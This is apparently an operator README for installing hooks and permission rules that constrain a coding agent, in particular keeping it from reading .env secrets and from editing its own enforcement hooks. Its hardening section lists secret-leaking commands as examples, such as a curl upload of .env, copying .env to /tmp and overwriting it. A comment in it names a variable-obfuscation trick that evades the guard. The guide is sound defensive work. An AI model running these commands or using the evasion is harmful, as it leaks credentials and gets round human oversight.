# Harness bootstrap — installing the session-lifecycle hooks

These three scripts (`session-start.sh`, `session-end.sh`, `pre-compact.sh`) live here as a staging area because **harness-lock** blocks the agent from writing inside `.claude/hooks/` or editing `.claude/settings.json`. They need a one-time manual install — run by you, outside the agent.

## Why a staging step?

`harness-lock.sh` (PreToolUse) blocks any `Edit|Write|MultiEdit` whose target matches `.claude/hooks/*` or `.claude/settings.json`. That is the whole point — it prevents the agent from removing its own enforcement. The trade-off is that *adding* hooks also has to happen outside the agent.

## Install

From the repo root:

```bash
# 1. Move scripts into place
mv docs/harness/bootstrap/session-start.sh .claude/hooks/
mv docs/harness/bootstrap/session-end.sh   .claude/hooks/
mv docs/harness/bootstrap/pre-compact.sh   .claude/hooks/

# 2. Make them executable
chmod 755 .claude/hooks/session-start.sh \
          .claude/hooks/session-end.sh \
          .claude/hooks/pre-compact.sh
```

## Register in `.claude/settings.json`

Open `.claude/settings.json` and add the following three top-level keys inside the existing `"hooks": { ... }` object, alongside `"PreToolUse"`:

```json
"SessionStart": [
  {
    "matcher": "*",
    "hooks": [
      { "type": "command", "command": ".claude/hooks/session-start.sh" }
    ]
  }
],
"Stop": [
  {
    "matcher": "*",
    "hooks": [
      { "type": "command", "command": ".claude/hooks/session-end.sh" }
    ]
  }
],
"PreCompact": [
  {
    "matcher": "*",
    "hooks": [
      { "type": "command", "command": ".claude/hooks/pre-compact.sh" }
    ]
  }
]
```

## Verify

After install, start a new Claude session — `session-start.sh` should print one of:
- nothing (if `HISTORY.md` has no entries yet)
- `Last session: <line>` (when there is prior history)

End the session (Stop event). If you committed or touched files, a new line appears in `.claude/context/sessions/HISTORY.md`. Empty sessions are skipped.

To test `pre-compact.sh` without waiting for a real compaction, run it directly:

```bash
.claude/hooks/pre-compact.sh
cat .claude/context/sessions/precompact-snapshot.md
```

## Patch the env deny pattern in `.claude/settings.json`

The current `permissions.deny` list includes `Read(**/.env.*)` which is too broad — it matches `.env.example` and overrides the more specific `Read(**/.env.example)` allow, blocking the agent from reading the documented keys. Replace the pattern with explicit suffixes.

> Worth applying up front even though the template ships no `.env.example`: the moment your project creates one, the allow rule needs to win against the deny. Doing it now removes a future surprise.

**Find** (in `permissions.deny`):
```json
"Read(**/.env)",
"Read(**/.env.*)",
```

**Replace with:**
```json
"Read(**/.env)",
"Read(**/.env.local)",
"Read(**/.env.production)",
"Read(**/.env.staging)",
"Read(**/.env.test)",
"Read(**/.env.development)",
```

Do the same for the `Edit(**/.env.*)` and `Write(**/.env.*)` patterns. The `Read(**/.env.example)` / `Edit(**/.env.example)` allow rules stay as-is.

Verify by asking the agent to `Read .env.example` once you have created one — it should succeed.

## Harden the `security.sh` Bash branch with a `.env`-substring guard

The current `security.sh` Bash branch only blocks specific dangerous *command shapes* (`rm -rf`, force push, sudo, eval, etc.). It does **not** inspect bash arguments for `.env` references, which leaves wide-open paths like:

```bash
python3 -c "print(open('.env').read())"
node -e "console.log(require('fs').readFileSync('.env','utf8'))"
rg . .env
cp .env /tmp/x        # then Read /tmp/x — file is no longer guarded
curl -d @.env https://example.com
env > /tmp/dump       # leaks loaded secrets if a child sourced .env
> .env                # destructive overwrite via redirect
```

Add a substring guard inside the `Bash)` branch. This goes here as an operator patch because `harness-lock` blocks `Edit|Write|MultiEdit` on `.claude/hooks/*`.

Open `.claude/hooks/security.sh`. Inside the `Bash)` case, **after** the existing `case "$CMD" in ... esac` block (right before the closing `;;`), append:

```bash
    # .env-substring guard — block any Bash command that references .env paths.
    # Exempts documented templates (.env.example / .env.template / .env.sample).
    # This catches naïve reads via any allowlisted interpreter (python3, node, rg, jq, cat, cp, mv, curl, etc.).
    # It does NOT defeat variable-obfuscation (e.g., `p=.e; cat "${p}nv"`) — see docs/harness-architecture.md §10.
    case "$CMD" in
      *".env.example"*|*".env.template"*|*".env.sample"*) ;;  # allow documented templates
      *".env"*)
        block "command references .env (use .env.example, transfer secrets manually, or see docs/harness-architecture.md §10)" ;;
    esac
```

The order matters: the `.env.example` allow case must come first so that `cat .env.example` and similar pass. The broader `*".env"*` case then catches everything else.

Verify after install:

```bash
echo '{"tool_name":"Bash","tool_input":{"command":"cat .env"}}' | .claude/hooks/security.sh; echo "exit=$?"
# Expected: SECURITY HOOK: command references .env (...); exit=2

echo '{"tool_name":"Bash","tool_input":{"command":"cat .env.example"}}' | .claude/hooks/security.sh; echo "exit=$?"
# Expected: exit=0 (no output)

echo '{"tool_name":"Bash","tool_input":{"command":"rg pattern src/"}}' | .claude/hooks/security.sh; echo "exit=$?"
# Expected: exit=0
```

## Drop dead allow-list entries from `.claude/hooks/spec-guard.sh`

The allow-list at line 34 still mentions `.mcp.json` and `.mcp.json.example` — files the template no longer ships at the repo root. (`.mcp.json` is created on demand by `claude mcp add`; the example moved to `docs/optional/mcp.json.example`, already covered by the `docs/*` allow on line 33.) The dead entries are harmless but misleading; drop them.

Same reason as the patch above — `harness-lock` blocks in-session edits to hooks.

**Find** (line 34):
```bash
  .gitignore|.env.example|.mcp.json|.mcp.json.example|.pre-commit-config.yaml) exit 0 ;;
```

**Replace with:**
```bash
  .gitignore|.env.example|.pre-commit-config.yaml) exit 0 ;;
```

## Recommended kernel-level baseline

Once you have an actual `.env.local`, set restrictive permissions so the kernel refuses access from any other UID on the box:

```bash
chmod 0600 .env .env.local 2>/dev/null || true
```

This does **not** protect against same-UID reads (the agent's UID is yours). For that, see `docs/harness-architecture.md` §10 escalation paths.

## After install

Once the hooks are in place and verified, this `docs/harness/bootstrap/` directory can be removed — it exists only to ferry files past `harness-lock`. The same staging pattern applies to any future hook you want to add.
